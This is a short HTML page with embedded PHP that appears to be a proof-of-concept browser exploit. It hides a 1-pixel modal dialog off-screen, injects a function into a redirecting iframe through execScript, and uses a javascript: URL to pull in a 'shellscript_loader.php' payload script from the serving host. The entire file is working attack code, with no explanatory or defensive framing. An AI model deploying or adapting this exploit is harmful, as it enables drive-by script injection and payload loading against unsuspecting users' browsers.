<html>
<body>

<script language="Javascript">
    function InjectedDuringRedirection(){
     showModalDialog('md.htm',window,"dialogTop:-1000\;dialogLeft:-1000\;dialogHeight:1\;dialogWidth:1\;").location="javascript:'xxxxx<SCRIPT SRC=\\'<?php

echo "http://".$_SERVER["HTTP_HOST"].substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER["REQUEST_URI"],"/"))."/shellscript_loader.php";

?>\\'><\/script>'";
}
</script>

<script language="javascript">
    setTimeout("myiframe.execScript(InjectedDuringRedirection.toString())",500);
    setTimeout("myiframe.execScript('InjectedDuringRedirection()') ",550);
    document.write('<IFRAME ID=myiframe NAME=myiframe SRC="redir.php" WIDTH=200 HEIGHT=200></IFRAME>');
</script>

</body>
</html>
